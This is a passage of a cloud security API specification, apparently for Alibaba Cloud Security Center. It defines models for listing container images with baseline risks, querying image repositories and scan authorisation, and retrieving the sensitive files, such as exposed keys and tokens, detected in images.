      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      digest?: string(name='Digest', description='The SHA-256 value of the image digest.', example='2e6daffce524ffeae66cccaa90c8fc47de912346dcec295c27395b6d66db6423'),
      highRiskImage?: int32(name='HighRiskImage', description='The number of images on which **high** baseline risks are detected.', example='1'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageCreate?: long(name='ImageCreate', description='The timestamp when the image was created. Unit: milliseconds.', example='1636962328000'),
      imageId?: string(name='ImageId', description='The ID of the image.', example='cddb5fd33b34a1fabb358d0a19497cdfe362fe624821cb250947af0ea5cc****'),
      imageSize?: int32(name='ImageSize', description='The size of the image.', example='157408623'),
      imageUpdate?: long(name='ImageUpdate', description='The timestamp when the image was updated. Unit: milliseconds.', example='1636974116000'),
      instanceId?: string(name='InstanceId', description='The ID of the image instance.', example='cri-a595qp31knh9****'),
      instanceName?: string(name='InstanceName', description='The instance name of the server.', example='pre.mongo-196'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='47.96.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.16.XX.XX'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last baseline check was performed. Unit: milliseconds.', example='1649814050000'),
      lowRiskImage?: int32(name='LowRiskImage', description='The number of images on which **low** baseline risks are detected.', example='0'),
      middleRiskImage?: int32(name='MiddleRiskImage', description='The number of images on which **medium** baseline risks are detected.', example='0'),
      namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
      noRiskImage?: int32(name='NoRiskImage', description='The number of images that do not have baseline risks.', example='0'),
      pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
      regionId?: string(name='RegionId', description='The region ID of the image instance.', example='cn-beijing'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-1lt6q7167yh6****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='scanner'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
      repoType?: string(name='RepoType', description='The type of the image repository.', example='PRIVATE'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether the image is at risk. Valid values:

*   **YES**
*   **NO**', example='YES'),
      tag?: string(name='Tag', description='The version of the image.', example='v1'),
      targetId?: string(name='TargetId', description='The ID of the asset on which the baseline check is performed.', example='m-bp17m0pc0xprzbwo****'),
      targetName?: string(name='TargetName', description='The name of the asset on which the baseline check is performed.', example='spod'),
      targetType?: string(name='TargetType', description='The type of the asset on which the baseline check is performed. Valid values:

- ECS_IMAGE: image
- ECS_SNAPSHOT: snapshot', example='ECS_IMAGE'),
      totalItemCount?: int32(name='TotalItemCount', description='The total number of risk items that are detected on the image by using the baseline.', example='3'),
      uuid?: string(name='Uuid', description='The UUID of the image.', example='f58681174f944623345379e23b7b****'),
    }
  ](name='ImageInfos', description='The timestamp when the last baseline check was performed. Unit: milliseconds.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of the images returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Default value: **1**.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of images on which baseline risks are detected.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5B8C2156-2DB9-5A42-99E7-F2ED5AE9EA1F'),
}

model DescribeImageListWithBaselineNameResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageListWithBaselineNameResponseBody(name='body'),
}

async function describeImageListWithBaselineName(request: DescribeImageListWithBaselineNameRequest): DescribeImageListWithBaselineNameResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageListWithBaselineName', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageRepoCriteriaRequest {
  value?: string(name='Value', description='The value of the filter condition.

> You can perform fuzzy search based on the image ID, image tag, image instance ID, image repository name, image repository namespace, image repository ID, image repository region, image digest, and image repository type.', example='2.0.2', position='Query'),
}

model DescribeImageRepoCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition. Valid values:

*   **instanceId**: the ID of the image instance.
*   **repoName**: the name of the image repository.
*   **repoId**: the ID of the image repository.
*   **repoNamespace**: the namespace of the image repository.
*   **regionId**: the region in which the image resides.
*   **vulStatus**: indicates whether vulnerabilities exist.
*   **alarmStatus**: indicates whether security alerts exist.
*   **hcStatus**: indicates whether baseline risks exist.
*   **riskStatus**: indicates whether risks exist.
*   **registryType**: the type of the image repository.
*   **ImageId**: the image ID.
*   **tag**: the image tag.', example='vulStatus'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: The search condition needs to be specified.
*   **select**: The search condition is an option that can be selected from the drop-down list.', example='select'),
      values?: string(name='Values', description='The values of the search condition. This parameter is returned only if the value of **Type** is set to **select**.

> If the value of **Type** is set to **input**, the return value of this parameter is empty.', example='NO,YES'),
    }
  ](name='CriteriaList', description='An array consisting of the filter conditions that are supported by the image repository.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model DescribeImageRepoCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageRepoCriteriaResponseBody(name='body'),
}

async function describeImageRepoCriteria(request: DescribeImageRepoCriteriaRequest): DescribeImageRepoCriteriaResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageRepoCriteria', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageRepoDetailListRequest {
  criteria?: string(name='Criteria', description='The search conditions for assets. The value of this parameter is in the JSON format and contains the following fields:

*   **name**: the search condition.

*   **name**: the value of the search condition.

*   **logicalExp**: the logical relation for multiple search conditions. Valid values:

    *   **OR**: The search conditions use a logical **OR**.
    *   **AND**: The search conditions use a logical **AND**.

> You can call the [DescribeImageRepoCriteria](~~DescribeImageRepoCriteria~~) operation to query the supported search conditions.', example='[{"name":"vulStatus","value":"YES","logicalExp":"AND"}]', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship that you want to use to evaluate multiple search conditions. Valid values:

*   **OR**: Search conditions are evaluated by using a logical **OR**.
*   **AND**: Search conditions are evaluated by using a logical **AND**.', example='OR', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
}

model DescribeImageRepoDetailListResponseBody = {
  imageRepoResponses?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts that are generated for the image repository.', example='0'),
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated for the image repository. Valid values:

*   **YES**
*   **NO**', example='NO'),
      endpoints?: string(name='Endpoints', description='The address of the image repository.', example='[
      {
            "domains": [
                  "****.cn-shenzhen.cr.aliyuncs.com"
            ],
            "type": "internet"
      },
      {
            "domains": [
                  "****.cn-shenzhen.cr.aliyuncs.com"
            ],
            "type": "intranet"
      },
      {
            "domains": [
                  "****.cn-shenzhen.cr.aliyuncs.com"
            ],
            "type": "vpc"
      }
]'),
      hcCount?: int32(name='HcCount', description='The number of baseline risk items on the image repository.', example='0'),
      hcStatus?: string(name='HcStatus', description='Indicates whether baseline risk items are detected on the image repository. Valid values:

*   **NO**
*   **YES**', example='NO'),
      imageCount?: int32(name='ImageCount', description='The number of images.', example='3'),
      instanceId?: string(name='InstanceId', description='The ID of the image.', example='i-uf6fsg6xlmorug5****'),
      regionId?: string(name='RegionId', description='The region ID of the image.', example='cn-shanghai'),
      registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **acr**
*   **harbor**
*   **quay**
*   **CI/CD**', example='acr'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-2chlzf47w2rk****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='zeus'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='test-dev'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether the image repository is at risk. Valid values:

*   **YES**
*   **NO**', example='NO'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities detected on the image repository.', example='0'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities are detected on the image repository. Valid values:

*   **YES**
*   **NO**', example='NO'),
    }
  ](name='ImageRepoResponses', description='An array that consists of the information about image repositories.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of image repositories.', example='19'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model DescribeImageRepoDetailListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageRepoDetailListResponseBody(name='body'),
}

async function describeImageRepoDetailList(request: DescribeImageRepoDetailListRequest): DescribeImageRepoDetailListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageRepoDetailList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageRepoListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  fieldName?: string(name='FieldName', description='The name of the field that is used for the query. Valid values:

*   **repoName**: the name of the image repository
*   **repoNamespace**: the namespace to which the image repository belongs

>  This parameter takes effect only when the **OperateType** parameter is set to **other**.', example='repoName', position='Query'),
  fieldValue?: string(name='FieldValue', description='The value of the field that is used for the query.

>  This parameter takes effect only when the **OperateType** parameter is set to **other**.', example='zeus', position='Query'),
  operateType?: string(name='OperateType', description='The type of the operation. Valid values:

*   **count**: counts statistics
*   **other**: others', example='count', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='script7', position='Query'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2', position='Query'),
  targetType: string(name='TargetType', description='The condition by which the feature is applied. Valid values:

*   **image_repo**: the ID of the image repository', example='image_repo', position='Query'),
  type: string(name='Type', description='The type of the feature. Valid values:

*   **image_repo**: image repository protection', example='image_repo', position='Query'),
}

model DescribeImageRepoListResponseBody = {
  addTargetCount?: int32(name='AddTargetCount', description='The number of image repositories that are added to Security Center.', example='20'),
  allTargetCount?: int32(name='AllTargetCount', description='The total number of image repositories.', example='25'),
  delTargetCount?: int32(name='DelTargetCount', description='The number of excluded image repositories.', example='5'),
  imageRepoList?: [ 
    {
      flag?: string(name='Flag', description='Indicates whether the feature takes effect on the image repository. Valid values:

*   **add**: yes
*   **del**: no', example='add'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='zeus'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='sas-script'),
    }
  ](name='ImageRepoList', description='An array that consists of the information about image repositories.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of image repositories.', example='83'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeImageRepoListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageRepoListResponseBody(name='body'),
}

async function describeImageRepoList(request: DescribeImageRepoListRequest): DescribeImageRepoListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageRepoList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageScanAuthCountRequest {
}

model DescribeImageScanAuthCountResponseBody = {
  imageScan?: {
    imageScanCapacity?: long(name='ImageScanCapacity', example='15340'),
    instanceId?: string(name='InstanceId', example='sas-qdl123412****'),
    scanCount?: long(name='ScanCount', example='5489'),
  }(name='ImageScan'),
  requestId?: string(name='RequestId', example='892NYH839-0EDC-4CD0-A2EF-5BD294656C99'),
}

model DescribeImageScanAuthCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageScanAuthCountResponseBody(name='body'),
}

async function describeImageScanAuthCount(request: DescribeImageScanAuthCountRequest): DescribeImageScanAuthCountResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageScanAuthCount', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageScanAuthorizationRequest {
}

model DescribeImageScanAuthorizationResponseBody = {
  authStatus?: {
    status?: boolean(name='Status', description='Indicates whether Security Center is authorized to scan images. Valid values:
* **true**: yes 
* **false**: no', example='true'),
  }(name='AuthStatus', description='The authorization status of image scans.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='340D7FC4-D575-1661-8ACD-CFA7BE57****'),
}

model DescribeImageScanAuthorizationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageScanAuthorizationResponseBody(name='body'),
}

async function describeImageScanAuthorization(request: DescribeImageScanAuthorizationRequest): DescribeImageScanAuthorizationResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageScanAuthorization', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageSensitiveFileByKeyRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='0083a31ccf7c10367a6e783e8601****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Query'),
  scanRange?: [ string ](name='ScanRange', description='The type of the asset that you want to scan. Valid values:

*   **image**
*   **container**', shrink='json', position='Query'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The type of alerts for the sensitive files. Valid values:

*   **npm_token**: Node Package Manager (NPM) access token
*   **ftp_cfg**: FTP configuration
*   **google_oauth_key**: Google OAuth key
*   **planetscale_passwd**: PlanetScale password
*   **github_ssh_key**: Github SSH key
*   **msbuild_publish_profile**: MSBuild publish profile
*   **fastly_cdn_token**: Fastly CDN token
*   **ssh_private_key**: SSH private key
*   **aws_cli**: Amazon Web Services (AWS) CLI credentials
*   **cpanel_proftpd**: cPanel ProFTPD credentials
*   **postgresql_passwd**: PostgreSQL password
*   **discord_client_cred**: Discord client credentials
*   **rails_database**: Rails database configuration
*   **aws_access_key**: AWS Access Key
*   **esmtp_cfg** :Extended Simple Mail Transfer Protocol (ESMTP) configuration
*   **docker_registry_cfg**: Docker image repository configuration
*   **pem**: Privacy-Enhanced Mail (PEM)
*   **common_cred**: common credentials
*   **sftp_cfg**: Secure File Transfer Protocol (SFTP) connection configuration
*   **grafana_token**: Grafana token
*   **slack_token**: Slack token
*   **ec_private_key**: EC private key
*   **pypi_token**: Python Package Index (PyPI) token
*   **finicity_token**: Finicity token
*   **k8s_client_key**: Kubernetes private key
*   **git_cfg**: Git configuration
*   **django_key**: Django key
*   **jenkins_ssh**: Jenkins SSH configuration file
*   **openssh_private_key**: OpenSSL private key
*   **square_oauth**: OAuth credential for Square
*   **typeform_token**: Typeform token
*   **common_database_cfg**: general database connection configuration
*   **wordpress_database_cfg**: WordPress database configuration
*   **googlecloud_api_key**: API key for Google Cloud
*   **vscode_sftp**: VSCode SFTP configuration
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: PlanetScale token
*   **contentful_preview_token**: preview token for Contentful
*   **php_database_cfg**: database password for a PHP application
*   **atom_remote_sync**: Atom remote synchronization configuration
*   **aws_session_token**: AWS session token
*   **atom_sftp_cfg**: Atom SFTP configuration
*   **asana_client_private_key**: Asana client key
*   **tencentcloud_ak**: secret ID of a third-party cloud
*   **rsa_private_key**: Rivest-Shamir-Adleman (RSA) private key
*   **github_personal_token**: personal access token for GitHub
*   **pgp**: Pretty Good Privacy (PGP) encrypted file
*   **stripe_skpk**: Stripe secret key
*   **square_token**: Square access token
*   **rails_carrierwave**: Rails Carrierwave credential
*   **dbeaver_database_cfg**: DBeaver database configuration
*   **robomongo_cred**: Robomongo credentials
*   **github_oauth_token**: OAuth access token for GitHub
*   **pulumi_token**: Pulumi token
*   **ventrilo_voip**: Ventrilo VoIP server configuration
*   **macos_keychain**: macOS Keychain
*   **amazon_mws_token**: Amazon MWS token
*   **dynatrace_token**: Dynatrace token
*   **java_keystore**: Java KeyStore (JKS)
*   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database
*   **kubernetes_dashboard_cred**: user credentials for Kubernetes Dashboard
*   **atlassian_token**: Atlassian token
*   **rdp**: remote desktop protocol (RDP)
*   **mailgun_key**: Mailgun webhook signing key
*   **mailchimp_api_key**: API key for Mailchimp
*   **netrc_cfg**: .netrc configuration file
*   **openvpn_cfg**: OpenVPN configuration
*   **github_refresh_token**: GitHub refresh token
*   **salesforce**: Salesforce credentials
*   **salesforce**: Sendinblue credentials
*   **pkcs_private_key**: PKCS#12 key
*   **rubyonrails_passwd**: Ruby on Rails password file
*   **filezilla_ftp**: FileZilla FTP configuration
*   **databricks_token**: Databricks token
*   **gitLab_personal_toke**: personal access token for GitLab
*   **rails_master_key**: Rails master key
*   **sqlite**: SQLite3 or SQLite database
*   **firefox_logins**: Firefox logon configuration
*   **mailgun_private_token**: Mailgun private token
*   **joomla_cfg**: Joomla configuration
*   **hashicorp_terraform_token**: HashiCorp Terraform token
*   **jetbrains_ides**: JetBrains IDEs configuration
*   **heroku_api_key**: Heroku API key
*   **messagebird_token**: MessageBird token
*   **messagebird_token**: MessageBird token
*   **hashicorp_vault_token**: HashiCorp Vault token
*   **pgp_private_key**: PGP private key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: secret access key of a third-party cloud
*   **aws_s3cmd**: AWS S3cmd configuration
*   **php_config**: PHP configuration
*   **common_private_key**: private key of a common type
*   **microsoft_mdf**: Microsoft SQL Server database
*   **mediawiki_cfg**: MediaWiki configuration
*   **jenkins_cred**: Jenkins credentials
*   **rubygems_cred**: RubyGems credentials
*   **clojars_token**: Clojars token
*   **phoenix_web_passwd**: Phoenix web credentials
*   **puttygen_private_key**: PuTTYgen private key
*   **google_oauth_token**: Google OAuth access token
*   **rubyonrails_cfg**: Ruby On Rails database configuration
*   **lob_api_key**: Lob API key
*   **pkcs_cred**: PKCS#12 certificate
*   **otr_private_key**: Off-the-Record Messaging (OTR) private key
*   **contentful_delivery_token**: delivery token for Contentful
*   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration
*   **dsa_private_key**: Digital Signature Algorithm (DSA) private key
*   **rails_app_token**: Rails app token
*   **git_cred**: Git user credential
*   **newrelic_api_key**: User API key for New Relic
*   **github_hub**: hub configuration for storing GitHub tokens
*   **rubygem**: Rubygem Token', example='google_oauth_key', position='Query'),
}

model DescribeImageSensitiveFileByKeyResponseBody = {
  code?: string(name='Code', description='The status code returned. If the 200 status code is returned, the request was successful.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4NjE='),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  sensitiveFileList?: [ 
    {
      advice?: string(name='Advice', description='The suggestion.', example='Assess risks based on business conditions, remove risky content, and rebuild image'),
      description?: string(name='Description'),
      filePath?: string(name='FilePath', description='The file path.', example='/usr/lib/abc.txt'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1663321552000'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp generated when the last baseline check was performed. Unit: milliseconds.', example='1663691592000'),
      layerDigest?: string(name='LayerDigest', description='The digest of the image layer.', example='0083a31cc0083a31ccf7c10367a6e783e8601e290f7c10367a6e783e860****'),
      md5?: string(name='Md5'),
      promt?: string(name='Promt', description='The sensitive content.', example='AKPIDteow289f9s************'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
      sensitiveFileKey?: string(name='SensitiveFileKey', description='The type of alerts for the sensitive files. Valid values:

*   **npm_token**: NPM access token
*   **ftp_cfg**: FTP configuration
*   **google_oauth_key**: Google OAuth key
*   **planetscale_passwd**: PlanetScale password
*   **github_ssh_key** :Github SSH key
*   **msbuild_publish_profile**: MSBuild publish profile
*   **fastly_cdn_token**: Fastly CDN token
*   **ssh_private_key**: SSH private key
*   **aws_cli**: AWS CLI credentials
*   **cpanel_proftpd**: cPanel ProFTPD credentials
*   **postgresql_passwd**: PostgreSQL password file
*   **discord_client_cred**: Discord client credentials
*   **rails_database**: Rails database configuration
*   **aws_access_key**: AWS access key
*   **esmtp_cfg**: ESMTP configuration
*   **docker_registry_cfg**: configuration of a Docker image repository
*   **pem**: PEM
*   **common_cred**: common credential
*   **sftp_cfg**: SFTP connection configuration
*   **grafana_token**: Grafana token
*   **slack_token**: Slack token
*   **ec_private_key**: EC private key
*   **pypi_token**: upload token for the PyPI
*   **finicity_token**: Finicity token
*   **k8s_client_key**: Kubernetes private key
*   **git_cfg**: Git configuration
*   **django_key**: Django key
*   **jenkins_ssh**: Jenkins SSH configuration file
*   **openssh_private_key**: OpenSSL private key
*   **square_oauth**: OAuth credential for Square
*   **typeform_token**: Typeform token
*   **common_database_cfg**: general database connection configuration
*   **wordpress_database_cfg**: WordPress database configuration
*   **googlecloud_api_key**: API key for Google Cloud
*   **vscode_sftp**: VSCode SFTP configuration
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: PlanetScale token
*   **contentful_preview_token**: preview token for Contentful
*   **php_database_cfg**: database password for a PHP application
*   **atom_remote_sync**: Atom remote synchronization configuration
*   **aws_session_token**: AWS session token
*   **atom_sftp_cfg**: Atom SFTP configuration
*   **asana_client_private_key** :Asana client key
*   **tencentcloud_ak**: secret ID of a third-party cloud
*   **rsa_private_key**: RSA private key
*   **github_personal_token**: personal access token for GitHub
*   **pgp**: PGP encrypted file
*   **stripe_skpk**: Stripe secret key
*   **square_token**: Square access token
*   **rails_carrierwave**: Rails Carrierwave credential
*   **dbeaver_database_cfg**: DBeaver database configuration
*   **robomongo_cred**: credential for RoboMongo
*   **github_oauth_token**: OAuth access token for GitHub
*   **pulumi_token**: Pulumi token
*   **ventrilo_voip**: configuration of a Ventrilo VoIP server
*   **macos_keychain**: macOS keychain
*   **amazon_mws_token**: Amazon MWS token
*   **dynatrace_token**: Dynatrace token
*   **java_keystore**: JKS
*   **microsoft_sdf**: Microsoft SQL Server CE database
*   **kubernetes_dashboard_cred**: user credential for Kubernetes Dashboard
*   **atlassian_token**: Atlassian token
*   **rdp**: RDP
*   **mailgun_key**: Mailgun webhook signing key
*   **mailchimp_api_key**: API key for Mailchimp
*   **netrc_cfg**: .netrc configuration file
*   **openvpn_cfg**: OpenVPN configuration
*   **github_refresh_token**: GitHub refresh token
*   **salesforce**: Salesforce credentials
*   **salesforce**: Sendinblue credentials
*   **pkcs_private_key**: PKCS#12 key
*   **rubyonrails_passwd**: Ruby on Rails password file
*   **filezilla_ftp**: FileZilla FTP configuration
*   **databricks_token**: Databricks token
*   **gitLab_personal_toke**: personal access token for GitLab
*   **rails_master_key**: Rails master key
*   **sqlite**: SQLite3 or SQLite database
*   **firefox_logins**: Firefox logon configuration
*   **mailgun_private_token**: Mailgun private token
*   **joomla_cfg**: Joomla configuration
*   **hashicorp_terraform_token**: HashiCorp Terraform token
*   **jetbrains_ides**: JetBrains IDEs configuration
*   **heroku_api_key**: Heroku API key
*   **messagebird_token**: MessageBird token
*   **messagebird_token**: MessageBird token
*   **hashicorp_vault_token**: HashiCorp Vault token
*   **pgp_private_key**: PGP private key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: secret access key of a third-party cloud
*   **aws_s3cmd**: AWS S3cmd configuration
*   **php_config**: PHP configuration
*   **common_private_key**: private key of a common type
*   **microsoft_mdf**: Microsoft SQL Server database
*   **mediawiki_cfg**: MediaWiki configuration
*   **jenkins_cred**: Jenkins credentials
*   **rubygems_cred**: RubyGems credentials
*   **clojars_token**: Clojars token
*   **phoenix_web_passwd**: Phoenix web credentials
*   **puttygen_private_key**: PuTTYgen private key
*   **google_oauth_token**: Google OAuth access token
*   **rubyonrails_cfg**: Ruby On Rails database configuration
*   **lob_api_key**: Lob API key
*   **pkcs_cred**: PKCS#12 certificate
*   **otr_private_key**: OTR private key
*   **contentful_delivery_token**: delivery token for Contentful
*   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration
*   **dsa_private_key**: Digital DSA private key
*   **rails_app_token**: Rails app token
*   **git_cred**: Git user credentials
*   **newrelic_api_key**: User API key for New Relic
*   **github_hub**: hub configuration for storing GitHub tokens
*   **rubygem**: Rubygem Token', example='google_oauth_key'),
      sensitiveFileName?: string(name='SensitiveFileName', description='The alert type name of the sensitive file.', example='Google OAuth Key'),
    }
  ](name='SensitiveFileList', description='The information about the sensitive files.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeImageSensitiveFileByKeyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageSensitiveFileByKeyResponseBody(name='body'),
}

async function describeImageSensitiveFileByKey(request: DescribeImageSensitiveFileByKeyRequest): DescribeImageSensitiveFileByKeyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageSensitiveFileByKey', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageSensitiveFileListRequest {
  criteria?: string(name='Criteria', description='The value of the sensitive file type.', example='Rails Master Key', position='Query'),
  criteriaType?: string(name='CriteriaType', description='The type of the sensitive files that you want to query. Valid values:

*   **SensitiveFileKey**: the type of alerts for sensitive files. Valid values:

    *   **npm_token**: Node Package Manager (NPM) access token
    *   **ftp_cfg**: FTP configuration
    *   **google_oauth_key**: Google OAuth key
    *   **planetscale_passwd**: PlanetScale password
    *   **github_ssh_key**: Github SSH key
    *   **msbuild_publish_profile**: MSBuild publish profile
    *   **fastly_cdn_token**: Fastly CDN token
    *   **ssh_private_key**: SSH private key
    *   **aws_cli**: Amazon Web Services (AWS) CLI credentials
    *   **cpanel_proftpd**: cPanel ProFTPD credentials
    *   **postgresql_passwd**: PostgreSQL password
    *   **discord_client_cred**: Discord client credentials
    *   **rails_database**: Rails database configuration
    *   **aws_access_key**: AWS access key
    *   **esmtp_cfg**: Extended Simple Mail Transfer Protocol (ESMTP) configuration
    *   **docker_registry_cfg**: Docker image repository configuration
    *   **pem**: Privacy-Enhanced Mail (PEM)
    *   **common_cred**: common credentials
    *   **sftp_cfg**: Secure File Transfer Protocol (SFTP) connection configuration
    *   **grafana_token**: Grafana token
    *   **slack_token**: Slack token
    *   **ec_private_key**: EC private key
    *   **pypi_token**: upload token for the Python Package Index (PyPI)
    *   **finicity_token**: Finicity token
    *   **k8s_client_key**: Kubernetes private key
    *   **git_cfg**: Git configuration
    *   **django_key**: Django key
    *   **jenkins_ssh**: Jenkins SSH configuration file
    *   **openssh_private_key**: OpenSSL private key
    *   **square_oauth**: OAuth credential for Square
    *   **typeform_token**: Typeform token
    *   **common_database_cfg**: general database connection configuration
    *   **wordpress_database_cfg**: WordPress database configuration
    *   **googlecloud_api_key**: API key for Google Cloud
    *   **vscode_sftp**: VSCode SFTP configuration
    *   **apache_htpasswd**: Apache htpasswd
    *   **planetscale_token**: PlanetScale token
    *   **contentful_preview_token**: preview token for Contentful
    *   **php_database_cfg**: database password for a PHP application
    *   **atom_remote_sync**: Atom remote synchronization configuration
    *   **aws_session_token**: AWS session token
    *   **atom_sftp_cfg**: Atom SFTP configuration
    *   **asana_client_private_key**: Asana client key
